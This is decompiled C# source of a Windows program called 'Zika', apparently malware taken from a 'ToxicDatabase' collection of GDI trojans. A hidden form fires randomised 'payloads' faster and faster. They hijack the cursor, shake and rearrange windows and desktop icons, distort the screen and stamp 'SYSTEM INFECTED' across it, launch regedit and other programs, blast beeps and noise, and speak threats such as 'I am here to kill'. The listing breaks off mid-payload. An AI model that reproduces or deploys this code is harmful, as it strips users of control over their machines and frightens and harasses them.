// Decompiled with JetBrains decompiler
// Type: Zika.Form1
// Assembly: Zika, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C7CE6D81-E560-4B98-8463-4AED586D3B4E
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\GDI\Zika\Zika.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Zika.Properties;

#nullable disable
namespace Zika;

public class Form1 : Form
{
  public static bool f6open = false;
  private bool allowshowdisplay;
  private bool mouseEff1;
  private bool mouseEff2;
  private bool mouseEff3;
  private bool windowEff1;
  private bool windowEff2;
  private bool windowEff3;
  private bool wtfEff1;
  private bool wtfEff2;
  private bool wtfEff3;
  private bool wtfEff4;
  private bool wtfEff5;
  private static bool windowEff4 = false;
  private bool audio4;
  private Random r = new Random();
  private double a1;
  private double a2;
  private double s1;
  private double s2;
  private double xx;
  private int h1;
  private int w1;
  private int x1 = -1;
  private int y1;
  private int t;
  private int m1;
  private int m2;
  private int m3;
  private int we1;
  private int w2;
  private int w3;
  private int w4;
  private int w0;
  private int x0;
  private int x2;
  private int x3;
  private int x4;
  private int x5;
  private static List<IntPtr> blacklist = new List<IntPtr>();
  private bool direct;
  private int t4;
  private const int SW_SHOWNORMAL = 1;
  private const int SW_SHOWMINIMIZED = 2;
  private const int SW_SHOWMAXIMIZED = 3;
  private string[] specs = new string[40]
  {
    "{BACKSPACE}",
    "{BREAK}",
    "{CAPSLOCK}",
    "{DELETE}",
    "{DOWN}",
    "{END}",
    "{ENTER}",
    "{ESC}",
    "{HELP}",
    "{HOME}",
    "{INSERT}",
    "{LEFT}",
    "{NUMLOCK}",
    "{PGDN}",
    "{PGUP}",
    "{PRTSC}",
    "{RIGHT}",
    "{SCROLLLOCK}",
    "{TAB}",
    "{UP}",
    "{F1}",
    "{F2}",
    "{F3}",
    "{F4}",
    "{F5}",
    "{F6}",
    "{F7}",
    "{F8}",
    "{F9}",
    "{F10}",
    "{F11}",
    "{F12}",
    "{F13}",
    "{F14}",
    "{F15}",
    "{F16}",
    "{ADD}",
    "{SUBTRACT}",
    "{MULTIPLY}",
    "{DIVIDE}"
  };
  private string specc = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  private const int MIIM_STRING = 64 /*0x40*/;
  private const int MFT_STRING = 0;
  private const uint WM_SETTEXT = 12;
  private const int WM_ERASEBKGND = 20;
  private IContainer components;
  private Button button1;
  private System.Windows.Forms.Timer timer1;
  private Button button2;
  private Button button3;
  private Button button4;
  private Button button5;
  private Button button6;
  private Button button7;
  private Button button8;
  private Button button9;
  private Button button10;
  private Button button11;
  private Button button12;
  private Button button13;
  private Button button14;
  private Button button15;
  private System.Windows.Forms.Timer timer2;
  private System.Windows.Forms.Timer timer3;

  public Form1() => this.InitializeComponent();

  private void button1_Click(object sender, EventArgs e) => this.mouseEff1 = !this.mouseEff1;

  [DllImport("user32.dll", SetLastError = true)]
  internal static extern IntPtr GetForegroundWindow();

  [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  internal static extern bool GetWindowRect(IntPtr hWnd, ref Form1.RECT rect);

  [DllImport("user32.dll", SetLastError = true)]
  internal static extern bool MoveWindow(
    IntPtr hWnd,
    int X,
    int Y,
    int nWidth,
    int nHeight,
    bool bRepaint);

  protected override void SetVisibleCore(bool value)
  {
    base.SetVisibleCore(this.allowshowdisplay ? value : this.allowshowdisplay);
  }

  [DllImport("user32")]
  private static extern int PostMessage(IntPtr hwnd, int msg, IntPtr wParam, IntPtr lParam);

  [DllImport("user32")]
  private static extern IntPtr FindWindow(string className, string caption);

  [DllImport("user32")]
  private static extern IntPtr FindWindowEx(
    IntPtr parent,
    IntPtr startChild,
    string className,
    string caption);

  private static ArrayList GetAllChildrenWindowHandles(IntPtr hParent, int maxCount)
  {
    ArrayList childrenWindowHandles = new ArrayList();
    int num = 0;
    IntPtr startChild = IntPtr.Zero;
    IntPtr zero = IntPtr.Zero;
    for (; num < maxCount; ++num)
    {
      IntPtr windowEx = Form1.FindWindowEx(hParent, startChild, (string) null, (string) null);
      if (!(windowEx == IntPtr.Zero))
      {
        childrenWindowHandles.Add((object) windowEx);
        childrenWindowHandles.AddRange((ICollection) Form1.GetAllChildrenWindowHandles(windowEx, maxCount));
        startChild = windowEx;
      }
      else
        break;
    }
    return childrenWindowHandles;
  }

  [DllImport("user32.dll", SetLastError = true)]
  private static extern bool SetWindowPos(
    IntPtr hWnd,
    IntPtr hWndInsertAfter,
    int X,
    int Y,
    int cx,
    int cy,
    Form1.SetWindowPosFlags uFlags);

  private void timer1_Tick(object sender, EventArgs e)
  {
    if (this.h1 == 0)
    {
      this.h1 = Screen.PrimaryScreen.Bounds.Height;
      this.w1 = Screen.PrimaryScreen.Bounds.Width;
    }
    ++this.t;
    if (this.mouseEff1)
    {
      Point position = Cursor.Position;
      position.Offset((int) (Math.Sin(this.a1) * 5.0), (int) (Math.Cos(this.a1) * 5.0));
      Cursor.Position = position;
      this.a1 += 0.01;
      if (this.m1++ == 200)
      {
        this.m1 = 0;
        this.mouseEff1 = false;
      }
    }
    Point position1;
    Rectangle bounds;
    if (this.mouseEff2)
    {
      if (this.x1 < 0)
      {
        position1 = Cursor.Position;
        this.x1 = position1.X;
        position1 = Cursor.Position;
        this.y1 = position1.Y;
        bounds = Screen.PrimaryScreen.Bounds;
        this.h1 = bounds.Height;
        bounds = Screen.PrimaryScreen.Bounds;
        this.w1 = bounds.Width;
      }
      Cursor.Position = new Point((this.x1 + (int) this.s2) % this.w1, (this.y1 + (int) this.s1) % this.h1);
      position1 = Cursor.Position;
      this.x1 = position1.X;
      position1 = Cursor.Position;
      this.y1 = position1.Y;
      if (this.s1 == 0.0)
      {
        this.s1 = -10.0;
        this.s2 = this.r.NextDouble() * 60.0 - 30.0;
      }
      else if (this.s1 < 0.0 && this.s1 > -0.1)
        this.s1 = 0.05;
      else if (this.s1 <= 0.0)
        this.s1 /= 1.08;
      else if (this.s1 >= 0.0)
        this.s1 *= 1.08;
      if (this.m2++ == 500)
      {
        this.m2 = 0;
        this.mouseEff2 = false;
      }
    }
    if (this.mouseEff3)
    {
      Point position2 = Cursor.Position;
      position2.Offset(this.r.Next(-10, 11), this.r.Next(-10, 11));
      Cursor.Position = position2;
      if (this.m3++ == 500)
      {
        this.m3 = 0;
        this.mouseEff3 = false;
      }
    }
    if (this.wtfEff1)
    {
      IntPtr dc = Form1.GetDC(IntPtr.Zero);
      using (Graphics graphics1 = Graphics.FromHdc(dc))
      {
        graphics1.SmoothingMode = SmoothingMode.HighSpeed;
        Bitmap bitmap = new Bitmap(this.w1, this.h1);
        Graphics graphics2 = Graphics.FromImage((Image) bitmap);
        graphics2.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(this.w1, this.h1));
        graphics2.Dispose();
        float num = (float) (Math.Sin(this.a1) * 1.5 + 0.5);
        graphics1.ScaleTransform(num, num);
        graphics1.RotateTransform((float) this.a2);
        graphics1.DrawImage((Image) bitmap, new Rectangle(0, 0, bitmap.Width, bitmap.Height), 0, 0, bitmap.Width, bitmap.Height, GraphicsUnit.Pixel);
      }
      Form1.ReleaseDC(IntPtr.Zero, dc);
      this.a1 += 2.0;
      this.a2 += 3.0;
      if (this.x0++ == 200)
      {
        this.x0 = 0;
        this.wtfEff1 = false;
      }
    }
    if (this.wtfEff2)
    {
      try
      {
        Desktop.SaveDesktop();
        int length = Desktop.m_OriginalPoint.Length;
        IntPtr sysLvHwnd = Desktop.GetSysLVHwnd();
        position1 = Cursor.Position;
        int x = position1.X;
        position1 = Cursor.Position;
        int y = position1.Y;
        int lParam = Desktop.SendMessage(sysLvHwnd, 4151, 0, 0) & -524289;
        Desktop.SendMessage(sysLvHwnd, 4150, 0, lParam);
        for (int wParam = 0; wParam < length; ++wParam)
        {
          int num1 = Desktop.m_OriginalPoint[wParam].right - Desktop.m_OriginalPoint[wParam].left;
          int num2 = Desktop.m_OriginalPoint[wParam].bottom - Desktop.m_OriginalPoint[wParam].top;
          if (wParam == 0)
          {
            if (x >= Desktop.m_OriginalPoint[wParam].left - 15 && x <= Desktop.m_OriginalPoint[wParam].right + 15 && y >= Desktop.m_OriginalPoint[wParam].top - 15 && y <= Desktop.m_OriginalPoint[wParam].bottom + 15)
            {
              int num3 = (num1 + num2) / 2;
              double num4 = Math.Atan2((double) (y - (Desktop.m_OriginalPoint[wParam].top + num2 / 2)), (double) (x - (Desktop.m_OriginalPoint[wParam].left + num1 / 2)));
              int wLow = (int) ((double) Desktop.m_OriginalPoint[wParam].left - Math.Sin(num4) * (double) num3);
              int wHigh = (int) ((double) Desktop.m_OriginalPoint[wParam].top - Math.Cos(num4) * (double) num3);
              if (wLow < 0)
                wLow = 0;
              if (wHigh < 0)
                wHigh = 0;
              if (wLow > this.w1 - num1)
                wLow = this.w1 - num1;
              if (wHigh > this.h1 - num2)
                wHigh = this.h1 - num2;
              Desktop.SendMessage(sysLvHwnd, 4111, wParam, Form1.MakeLParam(wLow, wHigh));
            }
          }
          else if (x >= Desktop.m_OriginalPos[wParam].x - 15 && x <= Desktop.m_OriginalPos[wParam].x + num1 + 15 && y >= Desktop.m_OriginalPos[wParam].y - 15 && y <= Desktop.m_OriginalPos[wParam].y + num2 + 15)
          {
            int num5 = (num1 + num2) / 2;
            double num6 = Math.Atan2((double) (y - (Desktop.m_OriginalPos[wParam].y + num2 / 2)), (double) (x - (Desktop.m_OriginalPos[wParam].x + num1 / 2)));
            int wLow = (int) ((double) Desktop.m_OriginalPoint[wParam].left - Math.Sin(num6) * (double) num5);
            int wHigh = (int) ((double) Desktop.m_OriginalPoint[wParam].top - Math.Cos(num6) * (double) num5);
            if (wLow < 0)
              wLow = -wLow;
            if (wHigh < 0)
              wHigh = -wHigh;
            if (wLow > this.w1 - num1)
              wLow = this.w1 - num1 - (wLow - (this.w1 - num1));
            if (wHigh > this.h1 - num2)
              wHigh = this.h1 - num2 - (wHigh - (this.h1 - num2));
            Desktop.SendMessage(sysLvHwnd, 4111, wParam, Form1.MakeLParam(wLow, wHigh));
          }
        }
      }
      catch (Exception ex)
      {
      }
      if (this.x2++ == 5000)
      {
        this.x2 = 0;
        this.wtfEff2 = false;
      }
    }
    if (this.wtfEff3)
    {
      try
      {
        this.xx += 0.09;
        Desktop.SaveDesktop();
        int length = Desktop.m_OriginalPoint.Length;
        IntPtr sysLvHwnd = Desktop.GetSysLVHwnd();
        position1 = Cursor.Position;
        int x = position1.X;
        position1 = Cursor.Position;
        int y = position1.Y;
        int lParam = Desktop.SendMessage(sysLvHwnd, 4151, 0, 0) & -524289;
        Desktop.SendMessage(sysLvHwnd, 4150, 0, lParam);
        double num7 = 0.0;
        for (int wParam = 0; wParam < length; ++wParam)
        {
          num7 += 0.15;
          int num8 = Desktop.m_OriginalPoint[wParam].right - Desktop.m_OriginalPoint[wParam].left;
          int num9 = Desktop.m_OriginalPoint[wParam].bottom - Desktop.m_OriginalPoint[wParam].top;
          int wLow = (int) (Math.Sin(this.xx + num7) * (double) this.w1 / 4.0 + (double) (this.w1 / 2) - (double) (num8 / 2));
          int wHigh = (int) (Math.Cos(this.xx + num7) * (double) this.h1 / 4.0 + (double) (this.h1 / 2) - (double) (num9 / 2));
          Desktop.SendMessage(sysLvHwnd, 4111, wParam, Form1.MakeLParam(wLow, wHigh));
        }
      }
      catch (Exception ex)
      {
      }
      if (this.x3++ == 1000)
      {
        this.x3 = 0;
        this.wtfEff3 = false;
      }
    }
    if (this.wtfEff4)
    {
      Desktop.EnumWindows((Desktop.EnumWindowsProc) ((hwnd, lParam) =>
      {
        foreach (IntPtr childrenWindowHandle in Form1.GetAllChildrenWindowHandles(hwnd, int.MaxValue))
        {
          try
          {
            Form1.RECT rect = new Form1.RECT();
            Form1.GetWindowRect(childrenWindowHandle, ref rect);
            Form1.MoveWindow(childrenWindowHandle, rect.left + this.r.Next(-2, 3), rect.top + this.r.Next(-2, 3), rect.right - rect.left + this.r.Next(-2, 3), rect.bottom - rect.top + this.r.Next(-2, 3), false);
            Form1.SetWindowPos(childrenWindowHandle, (IntPtr) 0, rect.left + this.r.Next(-2, 3), rect.top + this.r.Next(-2, 3), rect.right - rect.left + this.r.Next(-2, 3), rect.bottom - rect.top + this.r.Next(-2, 3), Form1.SetWindowPosFlags.SWP_ASYNCWINDOWPOS | Form1.SetWindowPosFlags.SWP_NOACTIVATE | Form1.SetWindowPosFlags.SWP_NOOWNERZORDER);
          }
          catch (Exception ex)
          {
          }
        }
        try
        {
          Form1.RECT rect = new Form1.RECT();
          Form1.GetWindowRect(hwnd, ref rect);
          Form1.MoveWindow(hwnd, rect.left + this.r.Next(-2, 3), rect.top + this.r.Next(-2, 3), rect.right - rect.left + this.r.Next(-2, 3), rect.bottom - rect.top + this.r.Next(-2, 3), false);
          Form1.SetWindowPos(hwnd, (IntPtr) 0, rect.left + this.r.Next(-2, 3), rect.top + this.r.Next(-2, 3), rect.right - rect.left + this.r.Next(-2, 3), rect.bottom - rect.top + this.r.Next(-2, 3), Form1.SetWindowPosFlags.SWP_ASYNCWINDOWPOS | Form1.SetWindowPosFlags.SWP_NOACTIVATE | Form1.SetWindowPosFlags.SWP_NOOWNERZORDER);
        }
        catch (Exception ex)
        {
        }
        return true;
      }), IntPtr.Zero);
      if (this.x4++ == 100)
      {
        this.x4 = 0;
        this.wtfEff4 = false;
      }
    }
    if (this.wtfEff5)
    {
      IntPtr dc = Form1.GetDC(IntPtr.Zero);
      using (Graphics graphics3 = Graphics.FromHdc(dc))
      {
        Bitmap bitmap = new Bitmap(this.w1, this.h1);
        Graphics graphics4 = Graphics.FromImage((Image) bitmap);
        graphics4.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(this.w1, this.h1));
        graphics4.Dispose();
        graphics3.DrawImage((Image) bitmap, new Rectangle(0, 0, bitmap.Width, bitmap.Height - 1), 0, 1, bitmap.Width, bitmap.Height - 1, GraphicsUnit.Pixel);
      }
      Form1.ReleaseDC(IntPtr.Zero, dc);
      if (this.x5++ == 200)
      {
        this.x5 = 0;
        this.wtfEff5 = false;
      }
    }
    if (this.windowEff1)
    {
      Form1.RECT rect = new Form1.RECT();
      IntPtr foregroundWindow = Form1.GetForegroundWindow();
      Form1.GetWindowRect(foregroundWindow, ref rect);
      Form1.MoveWindow(foregroundWindow, rect.left, rect.top + (int) (Math.Sin(this.a2) * 6.0), rect.right - rect.left, rect.bottom - rect.top, true);
      this.a2 += 0.3;
      if (this.we1++ == 6000)
      {
        this.we1 = 0;
        this.windowEff1 = false;
      }
    }
    if (this.windowEff2)
    {
      Form1.RECT rect = new Form1.RECT();
      IntPtr foregroundWindow = Form1.GetForegroundWindow();
      Form1.GetWindowRect(foregroundWindow, ref rect);
      Form1.MoveWindow(foregroundWindow, rect.left, rect.top, rect.right - rect.left + this.r.Next(0, 2), rect.bottom - rect.top + this.r.Next(0, 2), true);
      if (this.w2++ == 4000)
      {
        this.w2 = 0;
        this.windowEff2 = false;
      }
    }
    if (Form1.windowEff4)
    {
      if (this.w0++ % 10 == 0)
      {
        ArrayList windows = Form1.GetWindows();
        if (this.h1 == 0)
        {
          bounds = Screen.PrimaryScreen.Bounds;
          this.h1 = bounds.Height;
          bounds = Screen.PrimaryScreen.Bounds;
          this.w1 = bounds.Width;
        }
        double angl = 0.0;
        double num10 = 2.0 * Math.PI / (double) windows.Count;
        int radius = Math.Min(this.w1, this.h1) / 2 - 220;
        int cx = this.w1 / 2;
        int cy = this.h1 / 2;
        foreach (IntPtr num11 in windows)
        {
          IntPtr win = num11;
          if (!Form1.blacklist.Contains(win))
          {
            try
            {
              Thread thread = new Thread((ThreadStart) (() => Form1.MoveWindow(win, (int) ((double) cx - (double) radius * Math.Sin(angl + this.a2)), (int) ((double) cy - (double) radius * Math.Cos(angl + this.a2)), 200, 200, true)));
              thread.Start();
              if (!thread.Join(100))
              {
                Form1.blacklist.Add(win);
                thread.Abort();
              }
            }
            catch (Exception ex)
            {
            }
            angl += num10;
          }
        }
        this.a2 += 0.9;
      }
      if (this.w4++ == 300)
      {
        this.w4 = 0;
        Form1.windowEff4 = false;
      }
    }
    if (this.windowEff3)
    {
      Form1.RECT rect = new Form1.RECT();
      IntPtr foregroundWindow = Form1.GetForegroundWindow();
      Form1.GetWindowRect(foregroundWindow, ref rect);
      position1 = Cursor.Position;
      int x = position1.X;
      position1 = Cursor.Position;
      int y = position1.Y;
      if (this.h1 == 0)
      {
        bounds = Screen.PrimaryScreen.Bounds;
        this.h1 = bounds.Height;
        bounds = Screen.PrimaryScreen.Bounds;
        this.w1 = bounds.Width;
      }
      if (x >= rect.left && x < rect.right && y >= rect.top && y < rect.bottom)
      {
        bool flag = false;
        Form1.GetWindowRect(foregroundWindow, ref rect);
        if (rect.left < 201)
        {
          Form1.MoveWindow(foregroundWindow, 420, rect.top, 200, 200, true);
          flag = true;
        }
        Form1.GetWindowRect(foregroundWindow, ref rect);
        if (rect.top < 201)
        {
          Form1.MoveWindow(foregroundWindow, rect.left, 420, 200, 200, true);
          flag = true;
        }
        Form1.GetWindowRect(foregroundWindow, ref rect);
        if (rect.right > this.w1 - 201)
        {
          Form1.MoveWindow(foregroundWindow, this.w1 - 420, rect.top, 200, 200, true);
          flag = true;
        }
        Form1.GetWindowRect(foregroundWindow, ref rect);
        if (rect.bottom > this.h1 - 201)
        {
          Form1.MoveWindow(foregroundWindow, rect.left, this.h1 - 420, 200, 200, true);
          flag = true;
        }
        if (!flag)
        {
          if (y < (rect.top + rect.bottom) / 2 && x < (rect.left + rect.right) / 2 && x < this.w1 - 200 && y < this.h1 - 200)
            Form1.MoveWindow(foregroundWindow, x + 31 /*0x1F*/, y + 31 /*0x1F*/, 200, 200, true);
          else if (y < (rect.top + rect.bottom) / 2 && x > 200 && y < this.h1 - 200)
            Form1.MoveWindow(foregroundWindow, x - 201, y + 31 /*0x1F*/, 200, 200, true);
          else if (x < (rect.left + rect.right) / 2 && x < this.w1 - 200 && y > 200)
            Form1.MoveWindow(foregroundWindow, x + 31 /*0x1F*/, y - 201, 200, 200, true);
          else if (x > 200 && y > 200)
            Form1.MoveWindow(foregroundWindow, x - 201, y - 201, 200, 200, true);
        }
      }
      if (this.w3++ == 500)
      {
        this.w3 = 0;
        this.windowEff1 = false;
      }
    }
    if (!this.audio4 || this.t4++ != 6000)
      return;
    new SoundPlayer((Stream) Resources.NavaShield_Laugh_2).PlayLooping();
  }

  private double square(double v) => v * v;

  internal void timertick() => this.timer1_Tick((object) null, new EventArgs());

  internal void DirectMode() => this.direct = true;

  [DllImport("user32.dll")]
  private static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);

  private void button2_Click(object sender, EventArgs e) => this.mouseEff2 = !this.mouseEff2;

  private void button3_Click(object sender, EventArgs e) => this.windowEff1 = !this.windowEff1;

  private void button4_Click(object sender, EventArgs e) => this.windowEff2 = !this.windowEff2;

  public void PlayBeep(ushort frequency, int msDuration, ushort volume = 16383 /*0x3FFF*/, bool loop = true, bool sine = true)
  {
    MemoryStream output = new MemoryStream();
    BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
    int num1 = 16 /*0x10*/;
    int num2 = 8;
    short num3 = 1;
    short num4 = 1;
    int num5 = 44100;
    short num6 = 16 /*0x10*/;
    short num7 = (short) ((int) num4 * (((int) num6 + 7) / 8));
    int num8 = num5 * (int) num7;
    int num9 = (int) ((Decimal) num5 * (Decimal) msDuration / 1000M);
    int num10 = num9 * (int) num7;
    int num11 = 4 + num2 + num1 + num2 + num10;
    binaryWriter.Write(1179011410);
    binaryWriter.Write(num11);
    binaryWriter.Write(1163280727);
    binaryWriter.Write(544501094);
    binaryWriter.Write(num1);
    binaryWriter.Write(num3);
    binaryWriter.Write(num4);
    binaryWriter.Write(num5);
    binaryWriter.Write(num8);
    binaryWriter.Write(num7);
    binaryWriter.Write(num6);
    binaryWriter.Write(1635017060);
    binaryWriter.Write(num10);
    double num12 = (double) frequency * (2.0 * Math.PI) / (double) num5;
    double num13 = (double) ((int) volume >> 2);
    for (int index = 0; index < num9; ++index)
    {
      short num14 = !sine ? (short) (num13 * (double) Math.Sign(Math.Sin(num12 * (double) index))) : (short) (num13 * Math.Sin(num12 * (double) index));
      binaryWriter.Write(num14);
    }
    output.Seek(0L, SeekOrigin.Begin);
    if (loop)
      new SoundPlayer((Stream) output).PlayLooping();
    else
      new SoundPlayer((Stream) output).PlaySync();
    binaryWriter.Close();
    output.Close();
  }

  public void PlayNoise(int msDuration, ushort volume = 16383 /*0x3FFF*/, bool loop = true, bool sine = true)
  {
    MemoryStream output = new MemoryStream();
    BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
    int num1 = 16 /*0x10*/;
    int num2 = 8;
    short num3 = 1;
    short num4 = 1;
    int num5 = 44100;
    short num6 = 16 /*0x10*/;
    short num7 = (short) ((int) num4 * (((int) num6 + 7) / 8));
    int num8 = num5 * (int) num7;
    int num9 = (int) ((Decimal) num5 * (Decimal) msDuration / 1000M);
    int num10 = num9 * (int) num7;
    int num11 = 4 + num2 + num1 + num2 + num10;
    binaryWriter.Write(1179011410);
    binaryWriter.Write(num11);
    binaryWriter.Write(1163280727);
    binaryWriter.Write(544501094);
    binaryWriter.Write(num1);
    binaryWriter.Write(num3);
    binaryWriter.Write(num4);
    binaryWriter.Write(num5);
    binaryWriter.Write(num8);
    binaryWriter.Write(num7);
    binaryWriter.Write(num6);
    binaryWriter.Write(1635017060);
    binaryWriter.Write(num10);
    double num12 = (double) ((int) volume >> 2);
    for (int index = 0; index < num9; ++index)
    {
      short num13 = (short) (num12 * (2.0 * this.r.NextDouble() - 1.0));
      binaryWriter.Write(num13);
    }
    output.Seek(0L, SeekOrigin.Begin);
    if (loop)
      new SoundPlayer((Stream) output).PlayLooping();
    else
      new SoundPlayer((Stream) output).PlaySync();
    binaryWriter.Close();
    output.Close();
  }

  private void button5_Click(object sender, EventArgs e)
  {
    this.audio4 = false;
    this.PlayBeep((ushort) 1000, 1000);
  }

  private void button6_Click(object sender, EventArgs e)
  {
    this.audio4 = false;
    new Thread((ThreadStart) (() =>
    {
      for (int index = 0; index < 10; ++index)
      {
        this.PlayBeep((ushort) 175, 60, loop: false, sine: false);
        Thread.Sleep(180);
        this.PlayBeep((ushort) 175, 60, loop: false, sine: false);
        Thread.Sleep(180);
        this.PlayBeep((ushort) 175, 60, loop: false, sine: false);
        Thread.Sleep(260);
        this.PlayBeep((ushort) 175, 60, loop: false, sine: false);
        Thread.Sleep(100);
        this.PlayBeep((ushort) 175, 60, loop: false, sine: false);
        Thread.Sleep(100);
        this.PlayBeep((ushort) 185, 60, loop: false, sine: false);
        Thread.Sleep(100);
        this.PlayBeep((ushort) 175, 60, loop: false, sine: false);
        Thread.Sleep(180);
        this.PlayBeep((ushort) 175, 60, loop: false, sine: false);
        Thread.Sleep(180);
        this.PlayBeep((ushort) 175, 60, loop: false, sine: false);
        Thread.Sleep(100);
        this.PlayBeep((ushort) 156, 60, loop: false, sine: false);
        Thread.Sleep(20);
        this.PlayBeep((ushort) 131, 60, loop: false, sine: false);
        Thread.Sleep(20);
        this.PlayBeep((ushort) 156, 60, loop: false, sine: false);
        Thread.Sleep(20);
        this.PlayBeep((ushort) 131, 60, loop: false, sine: false);
        Thread.Sleep(20);
        this.PlayBeep((ushort) 233, 60, loop: false, sine: false);
        Thread.Sleep(20);
        this.PlayBeep((ushort) 208 /*0xD0*/, 60, loop: false, sine: false);
        Thread.Sleep(20);
        this.PlayBeep((ushort) 233, 60, loop: false, sine: false);
        Thread.Sleep(20);
        this.PlayBeep((ushort) 208 /*0xD0*/, 60, loop: false, sine: false);
        Thread.Sleep(20);
      }
    })).Start();
  }

  private void button7_Click(object sender, EventArgs e)
  {
    this.audio4 = false;
    this.PlayNoise(1000);
  }

  private void button8_Click(object sender, EventArgs e)
  {
    if (this.audio4)
      return;
    this.t4 = 0;
    new SoundPlayer((Stream) Resources.NavaShield_Laugh_1).PlayLooping();
    this.audio4 = true;
  }

  private void button9_Click(object sender, EventArgs e) => new Form2().Show();

  private void button10_Click(object sender, EventArgs e) => new Form3().Show();

  private void button11_Click(object sender, EventArgs e) => new Form4().Show();

  private void button12_Click(object sender, EventArgs e)
  {
  }

  private void button13_Click(object sender, EventArgs e) => this.windowEff3 = !this.windowEff3;

  private void button14_Click(object sender, EventArgs e) => Form1.windowEff4 = true;

  private void button15_Click(object sender, EventArgs e)
  {
    new SoundPlayer((Stream) Resources.pig).Play();
  }

  private void timer2_Tick(object sender, EventArgs e)
  {
    if (Form1.f6open)
      return;
    Application.DoEvents();
    int v = this.r.Next(0, 52);
    if (Program.debugmode)
      Console.WriteLine("payload #" + (object) v);
    this.doPayload(v);
    this.timer2.Interval = Math.Max(200, this.timer2.Interval - 1500);
    this.timer2.Stop();
    this.timer2.Start();
    Application.DoEvents();
  }

  public void doPayload(int v)
  {
    try
    {
      switch (v)
      {
        case 1:
          this.button1_Click((object) null, new EventArgs());
          break;
        case 2:
          this.button2_Click((object) null, new EventArgs());
          break;
        case 3:
          this.button3_Click((object) null, new EventArgs());
          break;
        case 4:
          this.button4_Click((object) null, new EventArgs());
          break;
        case 5:
          this.button5_Click((object) null, new EventArgs());
          break;
        case 6:
          this.button6_Click((object) null, new EventArgs());
          break;
        case 7:
          this.button7_Click((object) null, new EventArgs());
          break;
        case 8:
          this.button8_Click((object) null, new EventArgs());
          break;
        case 9:
          this.button9_Click((object) null, new EventArgs());
          break;
        case 10:
          this.button10_Click((object) null, new EventArgs());
          break;
        case 11:
          this.button11_Click((object) null, new EventArgs());
          break;
        case 12:
          this.button12_Click((object) null, new EventArgs());
          break;
        case 13:
          this.button13_Click((object) null, new EventArgs());
          break;
        case 14:
          this.button14_Click((object) null, new EventArgs());
          break;
        case 15:
          this.button15_Click((object) null, new EventArgs());
          break;
        case 16 /*0x10*/:
          Process.Start(((IEnumerable<string>) new string[4]
          {
            "explorer",
            "notepad",
            "mspaint",
            "regedit"
          }).PickRandom<string>());
          break;
        case 17:
          List<string> source = new List<string>();
          foreach (Environment.SpecialFolder folder in Enum.GetValues(typeof (Environment.SpecialFolder)))
            source.Add(Environment.GetFolderPath(folder));
          Process.Start("explorer", source.PickRandom<string>());
          break;
        case 19:
          using (SpeechSynthesizer speechSynthesizer = new SpeechSynthesizer())
          {
            speechSynthesizer.Speak(((IEnumerable<string>) new string[7]
            {
              "Hello World",
              "fuck you, fuck you, fuck you fuck you fuck you",
              "I am a robot from outer space",
              "I am a robot from the future",
              "haahhahhahahahahahahhahaha",
              "I am here to kill",
              "Die Die Die Die Die Die"
            }).PickRandom<string>());
            break;
          }
        case 20:
          try
          {
            Process.Start($"mailto:{((IEnumerable<string>) new string[3]
            {
              "bub",
              "beb",
              "bride"
            }).PickRandom<string>()}@sexsex.");
            break;
          }
          catch (Exception ex)
          {
            break;
          }
        case 21:
          IntPtr dc1 = Form1.GetDC(IntPtr.Zero);
          using (Graphics graphics = Graphics.FromHdc(dc1))
          {
            for (int index = 0; index < 50; ++index)
              graphics.DrawString("SYSTEM INFECTED", new Font(FontFamily.GenericMonospace, 12f), Brushes.Red, new PointF((float) this.r.Next(0, this.w1), (float) this.r.Next(0, this.h1)));
          }
          Form1.ReleaseDC(IntPtr.Zero, dc1);
          break;
        case 22:
          Form1.f6open = true;
          new Form6().Show();
          break;
        case 23:
          IEnumerator enumerator1 = Form1.GetWindows().GetEnumerator();
          try
          {
            while (enumerator1.MoveNext())
            {
              IntPtr current = (IntPtr) enumerator1.Current;
              try
              {
                Form1.ShowWindowAsync(current, 2);
              }
              catch (Exception ex)
              {
              }
            }
            break;
          }
          finally
          {
            if (enumerator1 is IDisposable disposable)
              disposable.Dispose();
          }
        case 24:
          IEnumerator enumerator2 = Form1.GetWindows().GetEnumerator();
          try
          {
            while (enumerator2.MoveNext())
            {
              IntPtr current = (IntPtr) enumerator2.Current;
              try
              {
                Form1.ShowWindowAsync(current, 3);
              }
              catch (Exception ex)
              {
              }
            }
            break;
          }
          finally
          {
            if (enumerator2 is IDisposable disposable)
              disposable.Dispose();
          }
        case 25:
          ColorMatrix newColorMatrix = new ColorMatrix(new float[5][]
          {
            new float[5]{ -1f, 0.0f, 0.0f, 0.0f, 0.0f },
            new float[5]{ 0.0f, -1f, 0.0f, 0.0f, 0.0f },
            new float[5]{ 0.0f, 0.0f, -1f, 0.0f, 0.0f },
            new float[5]{ 0.0f, 0.0f, 0.0f, 1f, 0.0f },
            new float[5]{ 1f, 1f, 1f, 0.0f, 1f }
          });
          IntPtr dc2 = Form1.GetDC(IntPtr.Zero);
          using (Graphics graphics1 = Graphics.FromHdc(dc2))
          {
            Bitmap bitmap = new Bitmap(this.w1, this.h1);
            Graphics graphics2 = Graphics.FromImage((Image) bitmap);
            graphics2.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(this.w1, this.h1));
            graphics2.Dispose();
            ImageAttributes imageAttr = new ImageAttributes();
            imageAttr.SetColorMatrix(newColorMatrix);
            graphics1.DrawImage((Image) bitmap, new Rectangle(0, 0, bitmap.Width, bitmap.Height), 0, 0, bitmap.Width, bitmap.Height, GraphicsUnit.Pixel, imageAttr);
          }
          Form1.ReleaseDC(IntPtr.Zero, dc2);
          break;
        case 26:
          IntPtr dc3 = Form1.GetDC(IntPtr.Zero);
          using (Graphics graphics3 = Graphics.FromHdc(dc3))
          {
            Bitmap bitmap = new Bitmap(this.w1, this.h1);
